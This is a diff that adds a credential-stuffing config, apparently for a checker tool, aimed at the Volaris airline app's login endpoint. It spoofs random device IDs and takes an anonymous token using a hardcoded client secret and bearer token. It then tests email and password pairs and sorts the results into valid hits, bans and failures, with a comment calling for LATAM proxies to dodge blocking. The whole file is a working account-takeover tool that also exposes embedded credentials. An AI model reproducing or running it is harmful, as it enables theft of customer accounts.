@@ -1,0 +1,17 @@
+# Need LATAM Proxies
+#
+# Randomize device_id
+BLOCK=SET|VAR=lastId|VALUE=RND(LENGTH>12, CHARS>ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
+# Get Login Token
+BLOCK=REQUEST-1|URL=https://volaris.tma.services/oauth/token|TYPE=POST|CONTENT=client_id=tma.volaris.prod.ios.uu9eebih&client_secret=jpALEDCKqrPJTdfkqrxUGxLwpLNt4rWwGSm4tjKvKfbnjhEFEY&device_id=C8B70346-4EA6-42B2-AA79-<lastId>&grant_type=client_credentials&version=2.10.13|HEADERS={"method": "POST", "scheme": "https", "path": "/oauth/token", "authority": "volaris.tma.services", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "app-attest-mobile-failure-reasons": "NONE", "authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJjb20udGhlbW9iaWxlbGlmZS50bWEuY29tbW9uLnNlY3VyaXR5Lm9hdXRoMi5Bbm9ueW1vdXNVc2VyQDhjMzJjYTIiLCJzY29wZSI6WyJyZWFkIiwid3JpdGUiXSwiYW1yIjpbImFub24iXSwiZXhwIjoxNjk0NDY5ODk3LCJkZXZpY2VJZCI6IkM4QjcwMzQ2LTRFQTYtNDJCMi1BQTc5LURCRkRDM0U3NDQyNiIsInZlcnNpb24iOiIyLjEwLjEzIiwianRpIjoiZjRlZDM2ZGQtNjQyZi00M2RmLWJhZmItMWIwMzI1YmIzNmQ4IiwicGxhdGZvcm0iOlsiaW9zIl0sImNsaWVudF9pZCI6InRtYS52b2xhcmlzLnByb2QuaW9zLnV1OWVlYmloIn0.b44BZQU3HcOZbNBoBqn1CEX1JN6AgQ69VhQ_fPN9WDLbLtHIsOHSvcoOzKJIZgGq0XSl4QfmuZ9zXAMcArxJ_oYbFLeqntZISzW-DvlVnD_cOYqXaWT0wJrygdFs5OCRzYLpbjpchwpK1NS5Vp_Pw7PtSia9UoLunL1vNQmxYrXqNGYMH9kFgwX4gx-RuxCmHyLGblZ5w8_1QG71wD1NRP-FHgvuYHMN9HdyNISKjDP822uL00alZvRD8rX1lEDnOurjaIkYa_lQcvcxE86OCc1SIDBxgprG7mGMwmJhGUmTjDuWu3QqirwevTg0uC7VoOAm2S4acxLGkZwG2pdIBD0mWByu9QhCY6UCsZlPa5pzLRxECOG2lAPg5HezaL-RsJ0vHm_7CmsfsUlMAJJACw5Pjm-11hF6aKGE83z6LOb6Qd3GNWYA5R35qk9SWvoJDGM14-3TX3sVQ5yERL7gNP7m6IF3GbC9DMyjiCw8B0pc4NC3WT1v3AJ2b6vv2VxC2MJTbmx7sGNc1ukhTxv_lFVzCvt2-5HIDHD9GvYpO8kTXtu6e3y9CPuAJLo_hDEcpdjLHcn0Yd8KXppB5wMjnjIFq-ixwmb-qgMOtf0lkJlQLHg_1IuvkUhEpTcd-e7i1NRYZzJaA7YcUhP6CUHaRoEeja0r8IZtdVLIFIEG1SI", "app-version": "2.10.13", "device-id": "C8B70346-4EA6-42B2-AA79-<lastId>", "accept-language": "es-419,es;q=0.9", "login-type": "anonymous", "platform": "ios", "accept-encoding": "gzip, deflate, br", "content-length": "197", "user-agent": "Volaris/2.10.13 iOS/16.3"}
+# Parse Login Token
+BLOCK=FIND-TOKEN|VAR=<REQUEST-1.text>|FIRST=access_token":"|LAST="
+# Send Login Request
+BLOCK=REQUEST-2|TYPE=POST|URL=https://volaris.tma.services/oauth/token|CONTENT=client_id=tma.volaris.prod.ios.bae9ahs2&device_id=C8B70346-4EA6-42B2-AA79-<lastId>&grant_type=password&password=<PASSWORD>&username=<EMAIL>&version=2.10.13|HEADERS={"method": "POST", "scheme": "https", "path": "/oauth/token", "authority": "volaris.tma.services", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "app-attest-mobile-failure-reasons": "NONE", "authorization": "Bearer <FIND-TOKEN>", "app-version": "2.10.13", "device-id": "C8B70346-4EA6-42B2-AA79-<lastId>", "accept-language": "es-419,es;q=0.9", "login-type": "member", "platform": "ios", "accept-encoding": "gzip, deflate, br", "content-length": "169", "user-agent": "Volaris/2.10.13 iOS/16.3"}
+BLOCK=PRINT|VAR=<REQUEST-2.text>
+# Parse Result
+BLOCK=RESULT|VAR=<REQUEST-2.text>|VALUE=Bad Username or Password|CATEGORY=DEAD
+BLOCK=RESULT|VAR=<REQUEST-2.text>|VALUE=Wrong user or password|CATEGORY=DEAD
+BLOCK=RESULT|VAR=<REQUEST-2.text>|VALUE=Too Many Requests|CATEGORY=BAN
+BLOCK=RESULT|VAR=<REQUEST-2.text>|VALUE=Forbidden|CATEGORY=BAN
+BLOCK=RESULT|VAR=<REQUEST-2.text>|VALUE=personId|CATEGORY=HIT|RETURN=Success!
